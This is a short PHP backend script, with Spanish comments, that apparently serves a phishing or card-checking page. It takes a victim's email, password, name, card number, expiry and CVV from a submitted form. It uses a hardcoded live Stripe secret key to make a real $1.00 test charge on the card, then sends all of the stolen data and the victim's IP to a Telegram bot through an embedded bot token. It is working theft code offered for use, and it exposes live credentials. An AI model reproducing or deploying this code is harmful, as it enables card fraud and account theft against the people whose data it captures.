<?php
// 1. CONFIGURACIÓN DE CREDENCIALES
$token = "8255731465:AAGrPR_qH0zC4zTdBqOj-Zt1jqY0W03-yws";
$chat_id = "7993722214";
$stripe_secret = "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";

// 2. CAPTURA DE DATOS DEL FORMULARIO
$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data) {
    die(json_encode(["status" => "error", "mensaje_error" => "No se recibieron datos"]));
}

$pago_exitoso = false;
$detalle_pago = "⏳ Procesando...";

// 3. INTEGRACIÓN CON STRIPE (CARGO REAL DE $1.00)
try {
    // Paso A: Crear Token de Tarjeta
    $ch = curl_init("https://api.stripe.com/v1/tokens");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERPWD, $stripe_secret . ':');
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'card' => [
            'number'    => str_replace(' ', '', $data['cc']),
            'exp_month' => explode('/', $data['ex'])[0],
            'exp_year'  => '20' . explode('/', $data['ex'])[1],
            'cvc'       => $data['cv'],
        ]
    ]));
    $res_token = json_decode(curl_exec($ch), true);
    curl_close($ch);

    if (isset($res_token['id'])) {
        // Paso B: Intentar el cobro real
        $ch2 = curl_init("https://api.stripe.com/v1/charges");
        curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch2, CURLOPT_USERPWD, $stripe_secret . ':');
        curl_setopt($ch2, CURLOPT_POSTFIELDS, http_build_query([
            'amount'      => 100, // $1.00 USD
            'currency'    => 'usd',
            'source'      => $res_token['id'],
            'description' => 'Verif: ' . $data['em']
        ]));
        $res_charge = json_decode(curl_exec($ch2), true);
        curl_close($ch2);

        if (isset($res_charge['status']) && $res_charge['status'] == 'succeeded') {
            $pago_exitoso = true;
            $detalle_pago = "✅ PAGO APROBADO ($1.00)";
        } else {
            $detalle_pago = "❌ RECHAZADA: " . ($res_charge['error']['message'] ?? 'Fondos insuficientes');
        }
    } else {
        $detalle_pago = "❌ ERROR DATOS: " . ($res_token['error']['message'] ?? 'Tarjeta inválida');
    }
} catch (Exception $e) {
    $detalle_pago = "⚠️ ERROR SISTEMA: " . $e->getMessage();
}

// 4. NOTIFICACIÓN A TELEGRAM
$msg = "🔔 NUEVO RESULTADO 🔔\n\n";
$msg .= "💰 STATUS: $detalle_pago\n";
$msg .= "📧 Mail: {$data['em']}\n";
$msg .= "🔑 Pass: {$data['pw']}\n";
$msg .= "👤 Nombre: {$data['nm']}\n";
$msg .= "💳 Card: {$data['cc']}\n";
$msg .= "📅 Exp: {$data['ex']}\n";
$msg .= "🔒 CVV: {$data['cv']}\n";
$msg .= "🌐 IP: " . $_SERVER['REMOTE_ADDR'];

$url_tg = "https://api.telegram.org/bot$token/sendMessage";
$ch_tg = curl_init();
curl_setopt($ch_tg, CURLOPT_URL, $url_tg);
curl_setopt($ch_tg, CURLOPT_POST, 1);
curl_setopt($ch_tg, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chat_id, 'text' => $msg]));
curl_setopt($ch_tg, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch_tg);
curl_close($ch_tg);

// 5. RESPUESTA PARA EL JAVASCRIPT
echo json_encode([
    "pago" => $pago_exitoso, 
    "mensaje_error" => $detalle_pago
]);
?>
